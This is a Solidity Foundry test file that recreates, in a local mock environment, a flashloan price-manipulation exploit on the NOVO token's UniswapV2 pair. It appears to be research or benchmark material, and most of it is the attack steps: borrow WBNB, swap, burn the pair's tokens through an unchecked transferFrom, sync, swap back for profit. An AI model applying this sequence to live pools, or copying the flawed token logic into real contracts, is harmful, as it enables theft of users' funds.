// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./NOVO.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract NOVOTest is Test, BlockLoader {
    WBNB wbnb;
    NOVO novo;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address novoAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1653831935;
    uint112 reserve0pair = 120090152116998645;
    uint112 reserve1pair = 395001031454274158328;
    uint32 blockTimestampLastpair = 1653795431;
    uint256 kLastpair = 47431376555807750484268380356758619314;
    uint256 price0CumulativeLastpair =
        250550398307406791330448545601492452154495242;
    uint256 price1CumulativeLastpair = 23905021586781263190943888370070935628;
    uint256 totalSupplynovo = 1000000000000000000;
    uint256 balanceOfnovopair = 120090152116998645;
    uint256 balanceOfnovoattacker = 0;
    uint256 balanceOfnovonovo = 353303644762273;
    uint256 totalSupplywbnb = 5209947283371589566696235;
    uint256 balanceOfwbnbpair = 395001031454274158328;
    uint256 balanceOfwbnbattacker = 0;
    uint256 balanceOfwbnbnovo = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        novo = new NOVO();
        novoAddr = address(novo);
        pair = new UniswapV2Pair(
            address(novo),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        novo.transfer(address(novo), balanceOfnovonovo);
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        novo.transfer(address(pair), balanceOfnovopair);
        novo.afterDeploy(address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(wbnb),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("Novo Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(novo),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(novo),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(pair),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(novo),
            address(attacker),
            novo.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_novo_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        novo.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_novo_owner(uint256 amount) internal eurus {
        novo.transfer(owner, amount);
    }

    function borrow_wbnb_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_pair(uint256 amount) internal eurus {
        wbnb.transfer(address(pair), amount);
    }

    function borrow_novo_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        novo.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_novo_pair(uint256 amount) internal eurus {
        novo.transfer(address(pair), amount);
    }

    function swap_pair_attacker_novo_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        novo.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_novo(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_novo_pair(uint256 amount) internal eurus {
        novo.transferFrom(address(pair), address(novo), amount);
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_novo(amt1, amt2);
        swap_pair_attacker_novo_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_novo(amt1, amt2);
        burn_novo_pair(amt3);
        swap_pair_attacker_novo_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_wbnb_owner(17e18);
        printBalance("After step0 ");
        swap_pair_attacker_wbnb_novo(
            wbnb.balanceOf(attacker),
            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
        );
        printBalance("After step1 ");
        burn_novo_pair(0.113951614e18);
        printBalance("After step2 ");
        swap_pair_attacker_novo_wbnb(
            novo.balanceOf(attacker),
            pair.getAmountOut(novo.balanceOf(attacker), address(novo))
        );
        printBalance("After step3 ");
        payback_wbnb_owner((17e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_novo(amt1, amt2);
        burn_novo_pair(amt3);
        swap_pair_attacker_novo_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
